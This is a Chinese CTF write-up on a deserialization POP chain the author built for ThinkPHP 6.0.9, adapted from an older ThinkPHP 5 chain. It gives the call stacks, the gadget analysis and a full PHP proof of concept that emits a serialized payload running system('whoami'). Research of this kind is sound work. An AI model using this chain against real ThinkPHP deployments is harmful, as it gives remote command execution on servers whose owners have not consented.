date: 2021-11-20
categories:

- 漏洞挖掘
tags:
- 漏洞挖掘
title: tp6新pop链
---
# tp6新pop链

周末打西湖有题tp6.0.9的题目，没找到pop链，于是自己挖了一条（后面才知道有现成的能用

## 调用栈

```
Request.php:1418, think\Request->filterValue()
Request.php:1304, think\Request->filterData()
Request.php:1286, think\Request->input()
Request.php:959, think\Request->get()
Memcache.php:96, think\cache\driver\Memcache->get()
Driver.php:116, think\cache\driver\Memcache->push()
Handler.php:128, call_user_func_array:{D:\phpStudy\PHPTutorial\WWW\tp6\vendor\league\flysystem\src\Handler.php:128}()
Handler.php:128, League\Flysystem\File->__call()
Formatter.php:135, League\Flysystem\File->push()
Formatter.php:135, think\console\output\Formatter->format()
Console.php:56, think\console\output\driver\Console->write()
Output.php:162, think\console\Output->write()
Output.php:151, think\console\Output->writeln()
Output.php:132, think\console\Output->block()
Output.php:222, call_user_func_array:{D:\phpStudy\PHPTutorial\WWW\tp6\vendor\topthink\framework\src\think\console\Output.php:222}()
Output.php:222, think\console\Output->__call()
ChannelSet.php:36, think\console\Output->channel()
ChannelSet.php:36, think\log\ChannelSet->__call()
Conversion.php:272, think\log\ChannelSet->append()
Conversion.php:272, think\model\Pivot->appendAttrToArray()
Conversion.php:251, think\model\Pivot->toArray()
Conversion.php:324, think\model\Pivot->toJson()
Conversion.php:329, think\model\Pivot->__toString()
Model.php:361, think\model\Pivot->db()
Model.php:564, think\model\Pivot->checkAllowFields()
Model.php:620, think\model\Pivot->updateData()
Model.php:535, think\model\Pivot->save()
Model.php:1065, think\model\Pivot->__destruct()
```

## 分析

因为看tp6某些部分和tp5还是有些接近的于是参考之前TCTF挖的tp5的链挖了一条

tp5的调用栈：

```
Request.php:1090, think\Request->filterValue()
Request.php:1040, think\Request->input()
Request.php:706, think\Request->get()
Memcache.php:66, think\cache\driver\Memcache->has()
Memcache.php:98, think\cache\driver\Memcache->set()
Memcache.php:94, think\session\driver\Memcache->write()
Output.php:154, think\console\Output->write()
Output.php:143, think\console\Output->writeln()
Output.php:124, think\console\Output->block()
Output.php:212, call_user_func_array:{D:\phpStudy\PHPTutorial\WWW\tp5\thinkphp\library\think\console\Output.php:212}()
Output.php:212, think\console\Output->__call()
Model.php:912, think\console\Output->getAttr()
Model.php:912, think\model\Pivot->toArray()
Model.php:936, think\model\Pivot->toJson()
Model.php:2267, think\model\Pivot->__toString()
Windows.php:163, file_exists()
Windows.php:163, think\process\pipes\Windows->removeFiles()
Windows.php:59, think\process\pipes\Windows->__destruct()
```

顺着这条链看发现缺了`__call`的部分，于是找形如:`$val->xxx()`的地方

在`\think\model\concern\Conversion::appendAttrToArray`找到

```php
protected function appendAttrToArray(array &$item, $key, $name)
    {
...
            $item[$key] = $relation ? $relation->append($name)
                ->toArray() : [];
...
    }
```



但是有个问题这里传入的$name是个数组，而tp5中`__call`的目标`block`的参数类型不同，于是我们要找一处可控参数的`__call`，爆搜`__call`找到

`\think\log\ChannelSet::__call`

```php
public function __call($method, $arguments)
    {
        foreach ($this->channels as $channel) {
            $this->log->channel($channel)->{$method}(...$arguments);
        }
    }
```

接着调用`think\console\Output::__call`

继续走下去，tp5中的`think\session\driver\Memcache->write`在tp6中无了，只能再找一个能跳到`get`的跳板了

对着write一个一个翻过去发现`think\console\output\driver\Console->write`调了push方法，而`think\cache\driver\Memcache->push`的push调用了get从而完成整条利用链

## PoC

```php
<?php

namespace League\Flysystem;
class File{
    protected $path="thisispath";
    protected $filesystem;
    function __construct(){
        $this->filesystem = new \think\cache\driver\Memcache();

    }
}

namespace think\console\output\driver;
class Console{
    private $output;
    private $formatter;

    function __construct(){
        $this->output = new \think\console\Output("another");
        $this->formatter = new \think\console\output\Formatter();
    }

}
namespace think\console\output;
class Formatter{
    private $styles=["channel"=>"style"];
    private $styleStack;
    function __construct(){
        $this->styleStack = new \League\Flysystem\File();
    }
}
namespace think\model\concern;

trait Attribute
{
    private $data = ["get_parent" => "data"];
    private $withAttr = ["get_parent" => "withAttr"];
}
namespace think\cache;
class Driver{

}
namespace think\cache\driver;
class Memcache extends \think\cache\Driver {
    protected $handler = null;
    function __construct(){
        $this->handler =new \think\Request();
    }

}

namespace think\session\driver;
class Cache{

}

namespace think\console;

class Output{

    private $handle = null;
    protected $styles = [
        'info',
        'error',
        'comment',
        'question',
        'highlight',
        'warning',
        "channel"
    ];
    function __construct($a=""){
        if($a!=""){
            return;
        }

        $this->handle = new \think\console\output\driver\Console();
    }
}

namespace think\log;
class ChannelSet{
    protected $channels;
    protected $log;
    function __construct($obj,$arg){
        $this->log = $obj;
        $this->channels = [$arg];
    }
}


namespace think;

abstract class Model
{
    use model\concern\Attribute;
    private $lazySave;
    protected $withEvent;
    private $exists;
    private $force;
    protected $table;
    protected $append = [];
    private $relation = [];
    function __construct($obj = '')
    {
        $this->lazySave = true;
        $this->withEvent = false;
        $this->exists = true;
        $this->force = true;
        $this->table = $obj;
        $this->relation = ["evil_key"=>new \think\log\ChannelSet(new \think\console\Output(),"test")];
        if($obj===""){
            $this->append=["evil_key"=>["aaa"]];
        }
    }
}
class Request{
protected $get = ["thisispath"=>"whoami"];
protected $filter="system";
}



namespace think\model;

use think\Model;

class Pivot extends Model
{
}
$a = new Pivot();
$b = new Pivot($a);

echo urlencode(serialize($b));
```



## 后记

看起来参考tp5来挖tp6的方法效率还是有点低的我挖了6小时左右才出来（而且链还挺长的，一点也不优雅，更像是用蛮力做出来的），虽然在比赛的时候就想到肯定有现成的，但是可能因为沉没成本的原因不甘心放弃就在眼前的新pop链（实际上我说出了快10次出来了）。有时候过于依赖之前的成功经验也是一种束缚。

